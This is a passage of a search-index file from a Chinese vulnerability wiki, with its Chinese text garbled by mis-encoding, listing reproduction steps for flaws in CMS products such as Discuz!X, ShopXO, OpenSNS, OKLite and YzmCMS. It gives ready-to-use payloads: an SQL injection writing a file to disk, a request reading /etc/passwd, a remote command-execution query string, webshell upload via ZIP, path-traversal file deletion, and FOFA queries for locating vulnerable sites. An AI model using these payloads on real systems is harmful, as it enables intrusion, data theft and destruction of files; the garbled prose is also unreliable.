session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } æ ¹æ®è¿™é‡Œå¾—åˆ°çš„ä»£ç ï¼Œå¯ä»¥çŸ¥é“å½“user_Id=1æ—¶,ä¼šè§£å¯†å¯†é’¥ååˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®åˆ™å¯ä»¥ç™»å½•ç³»ç»Ÿ æˆ‘ä»¬åœ¨æœ¬åœ°ä½¿ç”¨åŠ å¯†ä»£ç åŠ å¯†user_id=1å¾—åˆ°çš„cookieåˆ™å¯ä»¥ç™»å½•ç³»ç»Ÿ æ·»åŠ cookie: user_id=xxxxxxxxå³å¯æˆåŠŸç™»å½• [!NOTE] è·å–å¯†é’¥çš„æ–¹æ³•å‚ç…§ä¸Šä¸€ç¯‡å®¡è®¡æ–‡ç«  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/","title":"Discuz!X","keywords":"","body":"Discuz!X Discuz!X PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-09 08:58:05 "},"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Discuz!X/Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´.html","title":"Discuz!X <3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´","keywords":"","body":"Discuz!X æ¼æ´æè¿° ä¸ä¹…ä»¥å‰Discuz!Xçš„åå°æŠ«éœ²äº†ä¸€ä¸ªsqlæ³¨å…¥çš„æ¼æ´ï¼Œè¿™é‡Œä¹Ÿè¦æ„Ÿè°¢æ¼æ´çš„å‘ç°å’Œç ”ç©¶è€…ï¼ˆæ— ç³–çš„kn1f3)ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Discuz!X ç¯å¢ƒæ­å»º ç™¾åº¦äº‘ç›˜ä¸‹è½½é“¾æ¥ å¯†ç : 0515 å°† uploadç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·å…¥phpstudyä¸‹çš„WWWç›®å½•æ‰“å¼€ç½‘ç«™æŒ‰ç…§æ­¥éª¤å®‰è£…å°±è¡Œäº† æ¼æ´å¤ç° æ¥åˆ°åå°é¡µé¢, åœ¨ UCenter åº”ç”¨ ID ä½ç½®çš„å‚æ•°æ·»åŠ å•å¼•å·å¹¶æŠ“åŒ… å‘ç°å‡ºç°SQLè¯­å¥æŠ¥é”™ ä½¿ç”¨æŠ¥é”™æ³¨å…¥å»è·å–ç‰ˆæœ¬å· è¿™é‡Œçš„å‚æ•°ä¸º settingnew[uc][appid] æŸ¥çœ‹æ–‡ä»¶ \\source\\admincp\\admincp_setting.phpï¼Œ åœ¨2677è¡Œæ‰¾åˆ°äº†è¾“å…¥ç‚¹ æ ¹æ®æŠ¥é”™è¯­å¥æ‰¾åˆ°SQLè¯­å¥æ‰§è¡Œç‚¹ï¼Œåœ¨æ–‡ä»¶uc_client\\model\\base.php ä¸­çš„ 206è¡Œ é€šè¿‡è¿™é‡Œçš„è¯­å¥å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ unionæ³¨å…¥ çš„æ–¹æ³•æ¥å†™å…¥æ¶æ„æ–‡ä»¶(secure_file_privä¸èƒ½ä¸ºNull) 1' union select \"\" into outfile 'D:/test.php';--+ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ–¹æ³• PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 10:08:32 "},"PeiQi_Wiki/CMSæ¼æ´/ShopXO/":{"url":"PeiQi_Wiki/CMSæ¼æ´/ShopXO/","title":"ShopXO","keywords":"","body":"ShopXO ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 09:03:01 "},"PeiQi_Wiki/CMSæ¼æ´/ShopXO/ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ShopXO/ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822.html","title":"ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822","keywords":"","body":"ShopXO download ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-15822 æ¼æ´æè¿° ShopXOæ˜¯ä¸€å¥—å¼€æºçš„ä¼ä¸šçº§å¼€æºç”µå­å•†åŠ¡ç³»ç»Ÿã€‚ShopXOå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ShopXO FOFA [!NOTE] app=\"ShopXOä¼ä¸šçº§B2Cç”µå•†ç³»ç»Ÿæä¾›å•†\" æ¼æ´å¤ç° å•†åŸä¸»é¡µå¦‚ä¸‹ å‘é€æ¼æ´è¯·æ±‚åŒ… GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 å…¶ä¸­ /url/xxxx ä¸­çš„ base64 è§£ç åä¸º /etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 09:03:03 "},"PeiQi_Wiki/CMSæ¼æ´/OpenSNS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/OpenSNS/","title":"OpenSNS","keywords":"","body":"OpenSNS OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-29 15:01:37 "},"PeiQi_Wiki/CMSæ¼æ´/OpenSNS/OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OpenSNS/OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"OpenSNS shareBox è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° OpenSNS å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å‘é€ç‰¹å®šçš„è¯·æ±‚åŒ…å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] OpenSNS FOFA [!NOTE] icon_hash=\"1167011145\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€Payload /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-29 15:04:14 "},"PeiQi_Wiki/CMSæ¼æ´/Typesetter/":{"url":"PeiQi_Wiki/CMSæ¼æ´/Typesetter/","title":"Typesetter","keywords":"","body":"Typesetter Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-18 23:44:56 "},"PeiQi_Wiki/CMSæ¼æ´/Typesetter/Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/Typesetter/Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° å¯ä»¥é€šè¿‡å°†.phpæ”¾åœ¨.zipæ–‡ä»¶ä¸­å¹¶è§£å‹ç¼©æ¥ç»•è¿‡å¯¹.phpæ–‡ä»¶çš„ä¿æŠ¤ã€‚ä¸€æ—¦å®Œæˆï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„çš„phpæ–‡ä»¶ï¼ˆwebshellï¼‰åœ¨è®¡ç®—æœºä¸Šæ‰§è¡Œå‘½ä»¤ å½±å“ç‰ˆæœ¬ [!NOTE] Typesetter CMS 5-5.1 æ¼æ´å¤ç° æŒ‰å¦‚ä¸‹æ­¥éª¤å¤ç° å‚è€ƒæ–‡ç«  Github ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 21:08:06 "},"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/","title":"YzmCMS","keywords":"","body":"YzmCMS YzmCMS Version å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-03 09:12:49 "},"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/YzmCMS/YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´.html","title":"YzmCMS Version  å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´","keywords":"","body":"YzmCMS version æ¼æ´æè¿° YzmCMSå†…å®¹ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€æ¬¾è½»é‡çº§å¼€æºå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå®ƒé‡‡ç”¨è‡ªä¸»ç ”å‘çš„æ¡†æ¶YZMPHPå¼€å‘ã€‚ç¨‹åºåŸºäºPHP+Mysqlæ¶æ„ï¼Œå¹¶é‡‡ç”¨MVCæ¡†æ¶å¼å¼€å‘çš„ä¸€æ¬¾é«˜æ•ˆå¼€æºçš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¯è¿è¡Œåœ¨Linuxã€Windowsã€MacOSXã€Solarisç­‰å„ç§å¹³å°ä¸Šã€‚ æºç å­˜åœ¨åè®®è¯†åˆ«çš„ç¼ºé™·ï¼Œå¯¼è‡´å­˜åœ¨SSRFæ¼æ´ æ¼æ´å½±å“ [!NOTE] YzmCMS version ç¯å¢ƒæ­å»º https://github.com/yzmcms/yzmcms æŒ‰ç…§æ–‡æ¡£å®‰è£…å³å¯ æ¼æ´å¤ç° ç™»å½•åå° --> æ¨¡å—ç®¡ç† --> é‡‡é›†ç®¡ç† æ·»åŠ é‡‡é›†è§„åˆ™ åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šç¼–è¾‘HTMLä»£ç  [!NOTE] æ ¹ç›®å½•å¯èƒ½ä¸åŒï¼Œpayloadéœ€è¦æ›´æ”¹ ç‚¹å‡»é‡‡é›†è¯»å–æ ¹ç›®å½•ä¸‹çš„ Flag å‡ºç°æ¼æ´çš„ä»£ç ä½ç½® yzmcms/yzmphp/core/class/cache_factory.class.php è¿™é‡Œè°ƒç”¨ url_check å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œåªæ£€æµ‹äº†å‰4ä½æ˜¯å¦ä¸º httpï¼Œä½¿ç”¨ httpxxx å³å¯ç»•è¿‡ å‚è€ƒæ–‡ç«  There are SSRF vulnerabilities in background collection management PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ezEIP/":{"url":"PeiQi_Wiki/CMSæ¼æ´/ezEIP/","title":"ezEIP","keywords":"","body":"ezEIP ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-03 10:24:24 "},"PeiQi_Wiki/CMSæ¼æ´/ezEIP/ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ezEIP/ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"ezEIP 4.1.0 ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° ezEIP 4.1.0 å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œé€šè¿‡éå†Cookieä¸­çš„å‚æ•°å€¼è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ezEIP 4.1.0 FOFA [!NOTE] \"ezEIP\" æ¼æ´å¤ç° æ¼æ´Urlä¸º /label/member/getinfo.aspx è®¿é—®æ—¶æ·»åŠ Cookieï¼ˆé€šè¿‡éå†è·å–ç”¨æˆ·çš„ç™»å½•åç”µè¯é‚®ç®±ç­‰ä¿¡æ¯ï¼‰ WHIR_USERINFOR=whir_mem_member_pid=1; PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:40 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/","title":"OKLite","keywords":"","body":"OKLite OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-21 14:06:05 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131.html","title":"OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131","keywords":"","body":"OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 æ¼æ´æè¿° OKLite v1.2.25 åå°æ¨¡å—å¯¼å…¥è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æœ¨é©¬æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° é¦–å…ˆè¦å…ˆæ¸…æ¥šå®ƒçš„æ‰§è¡Œæµç¨‹ æŸ¥çœ‹æ–‡ä»¶ framework/init.php åœ¨å¾€ä¸‹é¢çœ‹å¯ä»¥çœ‹åˆ°æ‰§è¡Œå‡½æ•°çš„é€»è¾‘ ä¾‹å¦‚ http://127.0.0.1/admin.php?c=ABC&f=EFG åˆ™æ˜¯è°ƒç”¨ framework\\admin\\ABC_control.phpä¸­çš„EFG_fæ–¹æ³• çœ‹åˆ°åœ¨åå°æœ‰ä¸€ä¸ª ZIP æ–‡ä»¶ä¸Šä¼ çš„å‡½æ•°ï¼Œæ‰¾ä¸€ä¸‹ä¸Šä¼ ZIPæ–‡ä»¶çš„ä½ç½® æ¨¡å—ç®¡ç† --> æ¨¡å—å¯¼å…¥ å›å¤´çœ‹ä¸‹å‡½æ•°æ–¹æ³•çš„è°ƒç”¨ public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('æœªæŒ‡å®šè¡¨å•åç§°')); } //å¦‚æœæœªæŒ‡å®šå­˜å‚¨æ–‡ä»¶å¤¹ï¼Œåˆ™ä½¿ç”¨ if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } è¿™é‡Œçš„ ä¸Šä¼ ç›®å½•é»˜è®¤ä¸º data/cache è¿™ä¸ªç›®å½•ï¼Œå¹¶è°ƒç”¨äº†ä¸¤ä¸ªæ–¹æ³• _upload å’Œ _save å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å¯¹ä¸Šä¼ çš„zipå¹¶æ²¡æœ‰å¯¹é‡Œé¢çš„æ–‡ä»¶æœ‰ä»€ä¹ˆè¿‡æ»¤,ä»»æ„ä¸Šä¼ ä¸€ä¸ªZIPæ–‡ä»¶æŠ“åŒ… test.phpæ–‡ä»¶å†…å®¹ å¦‚ä¸‹ï¼Œæ‰“åŒ…ä¸º test.zip ä¸Šä¼  å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨çš„æ–¹æ³•æ˜¯ upload_controlä¸­çš„ zip æ–¹æ³• è¿™é‡Œæ”¾åŒ…åå‘ç°è°ƒç”¨äº†å¦ä¸€ä¸ªæ–¹æ³•ï¼Œè·Ÿè¸ªä¸‹ä»£ç  framework/admin/module_control.php ä¸­çš„ import_fæ–¹æ³• è¿™é‡Œçš„æ–¹æ³•ä¸ºè§£å‹æ–¹æ³•ï¼Œè¯´æ˜ZIPæ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ä¸º æ¨¡å—ä¸Šä¼  --> ZIPæ–‡ä»¶å†™å…¥ data/cache --> è§£å‹åˆšåˆšçš„ZIPæ–‡ä»¶åˆ° data/cache ç›®å½• æ‰€ä»¥è¿™é‡Œçš„æµç¨‹å®Œå…¨æ˜¯æ²¡æœ‰è¿‡æ»¤å±é™©æ–‡ä»¶çš„ï¼Œå°†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶æ‰“åŒ…ä¸ºZIPæ–‡ä»¶ä¸Šä¼ è®¿é—®å³å¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:40 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° OKLite v1.2.25 åå°æ’ä»¶è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æœ¨é©¬æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° å…³äºæ‰§è¡Œé€»è¾‘å‚ç…§ä¸Šä¸€ç¯‡ OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 å‡ºç°æ¼æ´çš„ä½ç½®åœ¨äºframework/admin/plugin_control.php public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('é™„ä»¶ä¸å­˜åœ¨')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('éZIPæ–‡ä»¶ä¸æ”¯æŒåœ¨çº¿è§£å‹')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('æ–‡ä»¶ä¸å­˜åœ¨')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('æ’ä»¶å·²å­˜åœ¨ï¼Œä¸å…è®¸é‡å¤è§£å‹')); } if(!$info[1]){ $this->json(P_Lang('æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } è¿™é‡Œå¯ä»¥çœ‹åˆ°éœ€è¦ä¸Šä¼ ZIPå‹ç¼©åŒ…æ ¼å¼çš„æ’ä»¶ï¼Œè·Ÿè¿›zip_infoå‡½æ•° å‡½æ•°ä½ç½® framework/libs/phpzip.php è¿™é‡Œä¼šè¿”å›å…³äºZIPå‹ç¼©åŒ…çš„ä¸€äº›ä¿¡æ¯ å¾€ä¸‹çœ‹å…³é”®ä½ç½® $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('æ’ä»¶æœ‰å¼‚å¸¸')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('æ’ä»¶å·²å­˜åœ¨ï¼Œä¸å…è®¸é‡å¤è§£å‹')); } if(!$info[1]){ $this->json(P_Lang('æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); è¿™é‡Œç”¨ explodeå‡½æ•°ä»¥ / åˆ†éš”è¿”å›ä¸¤ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ ¼å¼åº”ä¸º AAA/BBBè¿™æ ·çš„ç›®å½•æ ¼å¼ï¼Œç›´æ¥ä¸Šä¼ ZIPæ–‡ä»¶åˆ™ä¼šæŠ¥é”™ æ’ä»¶æ‰“åŒ…æ¨¡å¼æœ‰é—®é¢˜ åœ¨è¿™é‡Œä¸Šä¼ ä¸€ä¸ªZIPæ–‡ä»¶ï¼Œæ ¼å¼è¦æ˜¯è§£å‹å‡ºæ¥ä¸ºç›®å½•ï¼Œç›®å½•ä¸­å«PHPæ–‡ä»¶å°±è¡Œäº† $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); æœ€åä¸¤è¡Œå‘Šè¯‰äº†æ–‡ä»¶è§£å‹çš„ä½ç½®ï¼Œä¸Šä¼ çš„æ–‡ä»¶åœ¨ pluginsç›®å½•ä¸‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:40 "},"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/OKLite/OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132.html","title":"OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132","keywords":"","body":"OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 æ¼æ´æè¿° OKLite 1.2.25 åå°é£æ ¼æ¨¡å—å­˜åœ¨ å¯¹å±é™©å­—ç¬¦æœªè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥åˆ é™¤ä»»æ„ç›®å½•å’Œæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] OKLite 1.2.25 æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„å‡½æ•°åœ¨æ–‡ä»¶ framework/admin/tpl_control.php ä¸­çš„ delfile_f() å‡½æ•° è¿™é‡Œåˆ é™¤æ–‡ä»¶ä¸»è¦è°ƒç”¨äº† rmå‡½æ•°, ä½ç½®åœ¨ framework/libs/file.php /** * åˆ é™¤æ“ä½œï¼Œè¯·ä¸€å®šè¦å°å¿ƒï¼Œåœ¨ç¨‹åºä¸­æœ€å¥½ä¸¥æ ¼ä¸€äº›ï¼Œä¸ç„¶æœ‰å¯èƒ½å°†æ•´ä¸ªç›®å½•åˆ æ‰ * @å‚æ•° $del è¦åˆ é™¤çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ * @å‚æ•° $type ä»…æ”¯æŒfileå’Œfolderï¼Œä¸ºfileæ—¶ä»…åˆ é™¤$delæ–‡ä»¶ï¼Œå¦‚æœ$delä¸ºæ–‡ä»¶å¤¹ï¼Œè¡¨ç¤ºåˆ é™¤å…¶ä¸‹é¢çš„æ–‡ä»¶ã€‚ä¸ºfolderæ—¶ï¼Œè¡¨ç¤ºåˆ é™¤$delè¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœä¸ºæ–‡ä»¶å¤¹ï¼Œè¡¨ç¤ºåˆ é™¤æ­¤æ–‡ä»¶å¤¹åŠå­é¡¹ * @è¿”å› true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } è¿™é‡Œå¯¹ä¼ å…¥çš„å‚æ•°éå†ï¼Œè·å¾—çš„æ–‡ä»¶åæˆ–æ–‡ä»¶å¤¹è¿›è¡Œåˆ é™¤ å›è¿‡å¤´çœ‹ è°ƒç”¨getå‡½æ•°ä¼ å…¥å‚æ•°æ—¶æ˜¯å¦æœ‰å¯¹ ../ çš„è¿‡æ»¤ å¯ä»¥çœ‹åˆ°å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œä½¿ç”¨è¿™é‡Œçš„æ¼æ´è¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤ æŠ“åŒ…ä¿®æ”¹æˆåŠŸåˆ é™¤æ–‡ä»¶ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:40 "},"PeiQi_Wiki/CMSæ¼æ´/BSPHP/":{"url":"PeiQi_Wiki/CMSæ¼æ´/BSPHP/","title":"BSPHP","keywords":"","body":"BSPHP BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-17 21:42:46 "},"PeiQi_Wiki/CMSæ¼æ´/BSPHP/BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/BSPHP/BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"BSPHP æœªæˆæƒè®¿é—® ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° BSPHP å­˜åœ¨æœªæˆæƒè®¿é—® æ³„éœ²ç”¨æˆ· IP å’Œ 